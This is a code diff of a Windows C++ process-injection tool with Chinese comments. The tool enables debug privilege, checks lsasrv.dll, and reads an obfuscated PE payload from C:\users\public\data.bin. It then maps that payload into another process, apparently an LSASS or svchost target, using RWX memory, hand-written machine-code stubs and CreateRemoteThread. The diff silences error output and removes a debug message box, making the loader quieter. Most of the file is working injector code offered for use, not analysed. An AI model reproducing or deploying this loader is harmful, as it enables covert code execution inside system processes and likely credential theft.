@@ -1,3 +1,4 @@
+
 #include <Windows.h>
 #include <tchar.h>
 #include <windows.h>
@@ -6,17 +7,20 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <userenv.h>
-#include <iostream>
 #include <windows.h>
 #include <wincrypt.h>
-#include <iostream>
-#include <iomanip>
-#include <string>
 #define jinyongyutiaoshi
 #define defincaoniam 9168
 #define HASH_KEY						13
 #pragma intrinsic( _rotr )
-
+DWORD myfuckingpow(int a, int b) {
+	int sum = 1;
+	for (int i = 0; i < b; i++) {
+		sum = a * sum;
+	}
+	if (b == 0)return 1;
+	return sum;
+}
 typedef struct
 {
 	WORD	offset : 12;
@@ -175,25 +179,25 @@ typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef DWORD(NTAPI* NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);
 
 char _final_md5_hash[33];
-bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
-	HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+bool CalculateMD5(char* filePath) {
+	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (hFile == INVALID_HANDLE_VALUE) {
-		std::cerr << "Error opening file: " << GetLastError() << std::endl;
+		//	、、std::cerr << "Error opening file: " << (unsigned int)GetLastError() << std::endl;
 		return false;
 	}
 
 
 	HCRYPTPROV hProv;
 	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-		std::cerr << "CryptAcquireContext failed: " << GetLastError() << std::endl;
+		//std::cerr << "CryptAcquireContext failed: " << (unsigned int)GetLastError() << std::endl;
 		CloseHandle(hFile);
 		return false;
 	}
 
 	HCRYPTHASH hHash;
 	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
-		std::cerr << "CryptCreateHash failed: " << GetLastError() << std::endl;
+		///std::cerr << "CryptCreateHash failed: " << (unsigned int)GetLastError() << std::endl;
 		CryptReleaseContext(hProv, 0);
 		CloseHandle(hFile);
 		return false;
@@ -205,7 +209,7 @@ bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
 
 	while (ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {
 		if (!CryptHashData(hHash, buffer, bytesRead, 0)) {
-			std::cerr << "CryptHashData failed: " << GetLastError() << std::endl;
+			//	std::cerr << "CryptHashData failed: " << (unsigned int)GetLastError() << std::endl;
 			CryptDestroyHash(hHash);
 			CryptReleaseContext(hProv, 0);
 			CloseHandle(hFile);
@@ -216,7 +220,7 @@ bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
 	BYTE hash[16];
 	DWORD hashSize = 16;
 	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashSize, 0)) {
-		std::cerr << "CryptGetHashParam failed: " << GetLastError() << std::endl;
+		//std::cerr << "CryptGetHashParam failed: " << (unsigned int)GetLastError() << std::endl;
 		CryptDestroyHash(hHash);
 		CryptReleaseContext(hProv, 0);
 		CloseHandle(hFile);
@@ -239,10 +243,11 @@ bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
 	return true;
 }
 
+
 int mainMD5() {
-	std::wstring filePath = L"C:\\windows\\system32\\lsasrv.dll";
-	std::wstring md5Hash;
-	return CalculateMD5(filePath, md5Hash);
+	char filePath[100] = "C:\\windows\\system32\\lsasrv.dll";
+
+	return CalculateMD5(filePath);
 }
 #define TABLE_LENGTH 1024
 bool EnableDebugPrivilege()
@@ -253,13 +258,13 @@ bool EnableDebugPrivilege()
 
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
 	{
-		std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
+		//std::cout << "Failed to open process token. Error: " << (unsigned int)GetLastError() << std::endl;
 		return false;
 	}
 
 	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
 	{
-		std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
+		//std::cout << "Failed to lookup privilege value. Error: " << (unsigned int)GetLastError() << std::endl;
 		CloseHandle(tokenHandle);
 		return false;
 	}
@@ -270,7 +275,7 @@ bool EnableDebugPrivilege()
 
 	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
 	{
-		std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
+		//std::cout << "Failed to adjust token privileges. Error: " << (unsigned int)GetLastError() << std::endl;
 		CloseHandle(tokenHandle);
 		return false;
 	}
@@ -419,7 +424,7 @@ int GetLsvchostsassPid() {
 	return 0;
 }
 
-int main(int argc, char** argv)
+int main()
 {
 	if (FBFileExists("C:\\users\\public\\3iaad")) {
 		DeleteFileA("C:\\users\\public\\3iaad");
@@ -484,7 +489,7 @@ int main(int argc, char** argv)
 	int finalnumber = 0;
 	int oi = 0;
 	for (int i = 0; i < maxpowenum; i++) {
-		int temp = (readlyversionnumber[oi++] - '0') * pow(10, maxpowenum - i);
+		int temp = (readlyversionnumber[oi++] - '0') * myfuckingpow(10, maxpowenum - i);
 		finalnumber += temp;
 	}
 	finalnumber = finalnumber + readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';
@@ -617,7 +622,7 @@ caonimade:
 #ifdef jinyongyutiaoshi
 	//_svchost_1_pid = defincaoniam;
 #endif // jinyongyutiaoshi
-	
+
 
 // 首先我们要枚举他的module，找到kernel32.dll的base addr
 
@@ -647,9 +652,9 @@ caonimade:
 					//}
 					int flag = 1;
 					for (int j = 0; j < 12; j++) {
-						if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j]-32 != szModuleName[strlen(szModuleName) - 1 - j])) {
+						if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j] - 32 != szModuleName[strlen(szModuleName) - 1 - j])) {
 							flag = 0;
-								break;
+							break;
 
 						}
 					}
@@ -680,7 +685,7 @@ caonimade:
 
 	// 从文件中读取shellcode并解密
 	// 唯一不同的是，我们这里的shellcode其实是一个混淆过的PE文件
-	const char* filePath = "data.bin"; // Replace with your file path
+	const char* filePath = "C:\\users\\public\\data.bin"; // Replace with your file path
 
 	// Open the file for reading
 	HANDLE hFile = CreateFileA(
@@ -766,9 +771,9 @@ caonimade:
 	// 加载剩余的所有节
 	// uiValueA = the VA of the first section
 	// 获取SizeOfOptionalHeader的size
-	 uiValueA = reinterpret_cast<DWORD64>(&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;// uiValueA是section header的地址
-	// 遍历所有的节并将它们加载到内存中
-	// itterate through all sections, loading them into memory.
+	uiValueA = reinterpret_cast<DWORD64>(&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;// uiValueA是section header的地址
+   // 遍历所有的节并将它们加载到内存中
+   // itterate through all sections, loading them into memory.
 	ULONG_PTR uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
 	while (uiValueE--)
 	{
@@ -873,7 +878,7 @@ caonimade:
 #ifdef jinyongyutiaoshi
 				printf("this is the function address retrieve from current process's kernel32.dll: %p\n", reinterpret_cast<BYTE*>(_____ashdjoajoidais));
 #endif // jinyongyutiaoshi
-				DWORD64 _tempoppapsdjioasdjhoiasjda= _____ashdjoajoidais - uiLibraryAddress+_target_process_kernel32_base_addr;
+				DWORD64 _tempoppapsdjioasdjhoiasjda = _____ashdjoajoidais - uiLibraryAddress + _target_process_kernel32_base_addr;
 #ifdef jinyongyutiaoshi
 				printf("this is the function address after fixed in target process: %p\n", reinterpret_cast<BYTE*>(_tempoppapsdjioasdjhoiasjda));
 #endif // jinyongyutiaoshi
@@ -905,7 +910,7 @@ caonimade:
 	void* _real_base_in_target_process = VirtualAllocEx(hw, NULL, _memeoy_size_to_be_allocated_in_target_process, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	// 	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
- 	uiLibraryAddress = reinterpret_cast<DWORD64>(_real_base_in_target_process) - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
+	uiLibraryAddress = reinterpret_cast<DWORD64>(_real_base_in_target_process) - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
 
 	// uiValueB = the address of the relocation directory
 	// .reloc地址
@@ -932,7 +937,7 @@ caonimade:
 
 			// uiValueD is now the first entry in the current relocation block
 			// 跳过头部，就进入了第一个entry
-		DWORD64	uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
+			DWORD64	uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
 
 			// we itterate through all the entries in the current block...
 			// 遍历所有的entry
@@ -945,14 +950,14 @@ caonimade:
 				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {
 
 #ifdef jinyongyutiaoshi
-					printf("base reloc offset: 0x%p\n", reinterpret_cast<BYTE*>(((PIMAGE_RELOC)uiValueD)->offset));
-					printf("after add to reloc block base: 0x%p\n", reinterpret_cast<BYTE*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset));
-					printf("here is the value in it, DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+				//	printf("base reloc offset: 0x%p\n", reinterpret_cast<BYTE*>(((PIMAGE_RELOC)uiValueD)->offset));
+				//	printf("after add to reloc block base: 0x%p\n", reinterpret_cast<BYTE*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset));
+				//	printf("here is the value in it, DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
 #endif // jinyongyutiaoshi
 					// 把这个地方的值取出来，加上delta再放回去即可
-					*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
+					* (ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
 #ifdef jinyongyutiaoshi
-					printf("here is the value after fixed up , DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+				//	printf("here is the value after fixed up , DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
 #endif // jinyongyutiaoshi
 				}
 				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
@@ -973,62 +978,62 @@ caonimade:
 	}
 
 	// 现在这个PE我们已经在我们当前进程中加载好了，剩下的就是简单的将其拷贝到目标进程地址中即可
-	
-		if (!WriteProcessMemory(hw, _real_base_in_target_process, reinterpret_cast<VOID*>(_pe_addr_load_in_current_process), _memeoy_size_to_be_allocated_in_target_process, NULL))
-		{
-				printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
-			exit( -1);
-		}
 
-		//获取入口函数地址，这里使用目标进程的预设基地址
-	//	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
-		uiValueA = (reinterpret_cast<DWORD64>(_real_base_in_target_process) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
-		printf("this is the entry point in target process: 0x%p\n", reinterpret_cast<BYTE*>(uiValueA));
+	if (!WriteProcessMemory(hw, _real_base_in_target_process, reinterpret_cast<VOID*>(_pe_addr_load_in_current_process), _memeoy_size_to_be_allocated_in_target_process, NULL))
+	{
+		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
+		exit(-1);
+	}
 
-		// 这个地址将作为alignrspcall的地址，首先我们需要写入align rsp的那一堆指令
+	//获取入口函数地址，这里使用目标进程的预设基地址
+//	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
+	uiValueA = (reinterpret_cast<DWORD64>(_real_base_in_target_process) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
+	printf("this is the entry point in target process: 0x%p\n", reinterpret_cast<BYTE*>(uiValueA));
 
-	// 把align rsp弄好我就要睡觉了
+	// 这个地址将作为alignrspcall的地址，首先我们需要写入align rsp的那一堆指令
 
-		void* _2_29bytes = VirtualAllocEx(hw, NULL, 29, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-		BYTE _fuckyou1 [12]= { 0x56,0x48,0x8B,0xF4,0x48,0x83,0xE4,0xF0,0x48,0x83,0xEC,0x20 };
-		if (!WriteProcessMemory(hw, _2_29bytes, _fuckyou1, 12, NULL))
-		{
-			printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
-			exit(-1);
-		}
-		// mov rax, .....
-		BYTE caonimadwozhendefue[2] = { 0x48,0xb8 };
-		if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes+12, caonimadwozhendefue, 2, NULL))
-		{
-			printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
-			exit(-1);
-		}
-		// 写入地址 8bytes
-		if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12+2, &uiValueA, 8, NULL))
-		{
-			printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
-			exit(-1);
-		}
-		// call rax
-		BYTE _CAL_RAX[2] = { 0xFF, 0xD0 };
-		if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2+8, _CAL_RAX, 2, NULL))
-		{
-			printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
-			exit(-1);
-		}
+// 把align rsp弄好我就要睡觉了
 
-		BYTE _CAL_RA___RET_X[5]={0x48, 0x8b, 0xe6, 0x5e, 0xc3};
-		if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8+2, _CAL_RA___RET_X, 5, NULL))
-		{
-			printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
-			exit(-1);
-		}
+	void* _2_29bytes = VirtualAllocEx(hw, NULL, 29, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	BYTE _fuckyou1[12] = { 0x56,0x48,0x8B,0xF4,0x48,0x83,0xE4,0xF0,0x48,0x83,0xEC,0x20 };
+	if (!WriteProcessMemory(hw, _2_29bytes, _fuckyou1, 12, NULL))
+	{
+		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
+		exit(-1);
+	}
+	// mov rax, .....
+	BYTE caonimadwozhendefue[2] = { 0x48,0xb8 };
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12, caonimadwozhendefue, 2, NULL))
+	{
+		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
+		exit(-1);
+	}
+	// 写入地址 8bytes
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2, &uiValueA, 8, NULL))
+	{
+		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
+		exit(-1);
+	}
+	// call rax
+	BYTE _CAL_RAX[2] = { 0xFF, 0xD0 };
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8, _CAL_RAX, 2, NULL))
+	{
+		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
+		exit(-1);
+	}
 
-		// 最后我们创建线程的时候，就从这个地址开始  _2_29bytes
-	//HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
-	//、、if (!hw)
-	//{
-	//	printf("Process Not found (0x%lX)\n", GetLastError());
+	BYTE _CAL_RA___RET_X[5] = { 0x48, 0x8b, 0xe6, 0x5e, 0xc3 };
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8 + 2, _CAL_RA___RET_X, 5, NULL))
+	{
+		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
+		exit(-1);
+	}
+
+	// 最后我们创建线程的时候，就从这个地址开始  _2_29bytes
+//HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
+//、、if (!hw)
+//{
+//	printf("Process Not found (0x%lX)\n", GetLastError());
 //		return -1;
 	//}
 	/*void* base = VirtualAllocEx(hw, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -1043,7 +1048,7 @@ caonimade:
 		CloseHandle(hw);
 		return -1;
 	}*/
-		MessageBoxA(NULL,"OK","OK",MB_OK);
+//	MessageBoxA(NULL, "OK", "OK", MB_OK);
 	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);
 	if (!thread)
 	{
@@ -1059,5 +1064,5 @@ caonimade:
 	VirtualFreeEx(hw, _2_29bytes, 29, MEM_DECOMMIT);
 	printf("free: 0x%x\n", (unsigned int)GetLastError());
 	//printf(
-	exit(-1);
-}
+	return 1;
+} 
